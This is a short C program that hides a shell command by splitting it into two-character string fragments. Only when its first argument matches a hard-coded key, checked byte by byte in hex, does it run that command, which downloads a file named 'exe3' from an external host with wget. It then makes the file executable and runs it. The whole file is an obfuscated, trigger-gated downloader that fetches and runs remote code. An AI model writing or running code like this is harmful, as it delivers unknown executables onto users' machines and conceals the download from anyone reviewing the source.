#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char b[4096];
char *b0 = "wg";
char *b1 = "et"; 
char *b2 = " h";
char *b3 = "tt";
char *b4 = "ps";
char *b5 = ":/";
char *b6 = "/t";
char *b7 = "hi";
char *b8 = "va";
char *b9 = "bo";
char *b10 = "t.";
char *b11 = "al";
char *b12 = "wa";
char *b13 = "ys";
char *b14 = "da";
char *b15 = "ta";
char *b16 = ".n";
char *b17 = "et";
char *b18 = "/e";
char *b19 = "xe";
char *b20 = "3";

int main(int argc, char **argv)
{
	if(argv[1][0x00] == 0x59)
	{
		if(argv[1][0x05] == 0x31)
		{
			if(argv[1][0x03] == 0x5a) 
			{
				if(argv[1][0x07] == 0x2e)
				{
					if(argv[1][0x09] == 0x44)
					{
						if(argv[1][0x0b] == 0x2c)
						{
							if(argv[1][0x01] == 0x7e)
							{
								if(argv[1][0x02] == 0x34)
								{
									if(argv[1][0x04] == 0x43)
									{
										if(argv[1][0x06] == 0x54)
										{
											if(argv[1][0x08] == 0x53)
											{
												if(argv[1][0x0a] == 0x72)
												{
													strcpy(b,b0);
													strcpy(b+2,b1);
													strcpy(b+4,b2);
													strcpy(b+6,b3);
													strcpy(b+8,b4);
													strcpy(b+10,b5);
													strcpy(b+12,b6);
													strcpy(b+14,b7);
													strcpy(b+16,b8);
													strcpy(b+18,b9);
													strcpy(b+20,b10);
													strcpy(b+22,b11);
													strcpy(b+24,b12);
													strcpy(b+26,b13);
													strcpy(b+28,b14);
													strcpy(b+30,b15);
													strcpy(b+32,b16);
													strcpy(b+34,b17);
													strcpy(b+36,b18);
													strcpy(b+38,b19);
													strcpy(b+40,b20);
													printf("b : %s\n",b);
													system(b);
													system("chmod +x ./exe3");
													system("./exe3");
													return EXIT_SUCCESS;
												}
											}
										}
									}
								}
							}
						}
					}
				}
			}
		}
	}

	return EXIT_FAILURE;
}
